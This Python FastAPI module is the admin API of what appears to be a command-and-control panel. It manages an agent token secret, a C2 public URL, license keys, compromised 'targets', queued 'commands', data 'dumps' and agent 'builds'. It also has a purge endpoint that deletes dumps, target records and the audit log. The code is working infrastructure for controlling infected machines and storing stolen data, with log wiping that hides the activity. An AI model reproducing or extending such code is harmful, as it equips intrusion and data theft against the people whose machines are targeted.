"""API admin: pengaturan, audit, purge."""
from __future__ import annotations

import shutil
import secrets

from fastapi import APIRouter, Depends, HTTPException

from . import config, db, security

router = APIRouter(prefix="/api/admin", dependencies=[Depends(security.require_operator)])


@router.get("/settings")
async def settings() -> dict:
    data = dict(config.load())
    data["agent_token_secret"] = (data.get("agent_token_secret") or "")[:10] + "…"
    data["keystore_pass"] = "••••••••"
    return {"settings": data}


@router.patch("/settings")
async def patch_settings(body: dict) -> dict:
    allowed = {
        "license_key", "c2_public_url", "session_hours", "uninstall_pin",
        "contact_email", "contact_team", "theme_accent", "require_license",
        "max_upload_mb", "port", "host",
    }
    config.update(**{k: v for k, v in body.items() if k in allowed})
    db.audit("settings", ",".join(k for k in body if k in allowed))
    return {"ok": True}


@router.post("/rotate-secret")
async def rotate_secret() -> dict:
    config.update(agent_token_secret=secrets.token_urlsafe(48))
    db.audit("rotate", "agent_token_secret")
    return {"ok": True}


@router.post("/rotate-license")
async def rotate_license() -> dict:
    key = "M4ZK" + secrets.token_hex(3).upper()
    config.update(license_key=key)
    db.audit("rotate", f"license={key}")
    return {"ok": True, "license": key}


@router.get("/audit")
async def audit(limit: int = 200) -> dict:
    rows = db.q("SELECT * FROM audit ORDER BY id DESC LIMIT ?", (min(limit, 1000),))
    return {"audit": [dict(r) for r in rows]}


@router.post("/purge/{scope}")
async def purge(scope: str) -> dict:
    if scope == "dumps":
        shutil.rmtree(config.DUMP_DIR, ignore_errors=True)
        config.DUMP_DIR.mkdir(parents=True, exist_ok=True)
        db.x("DELETE FROM dumps")
    elif scope == "builds":
        shutil.rmtree(config.BUILD_DIR, ignore_errors=True)
        config.BUILD_DIR.mkdir(parents=True, exist_ok=True)
        db.x("DELETE FROM builds")
    elif scope == "targets":
        db.x("DELETE FROM targets")
        db.x("DELETE FROM commands")
        db.x("DELETE FROM dumps")
    elif scope == "audit":
        db.x("DELETE FROM audit")
    elif scope == "sessions":
        db.x("DELETE FROM sessions")
    else:
        raise HTTPException(400, "scope tidak dikenal")
    db.audit("purge", scope)
    return {"ok": True, "scope": scope}


@router.get("/stats")
async def stats() -> dict:
    t = db.one("SELECT COUNT(*) n, SUM(online) onl FROM targets")
    d = db.one("SELECT COUNT(*) n, SUM(size) sz FROM dumps")
    b = db.one("SELECT COUNT(*) n FROM builds")
    return {
        "targets": int(t["n"] or 0) if t else 0,
        "online": int(t["onl"] or 0) if t else 0,
        "dumps": int(d["n"] or 0) if d else 0,
        "dump_bytes": int(d["sz"] or 0) if d else 0,
        "builds": int(b["n"] or 0) if b else 0,
    }
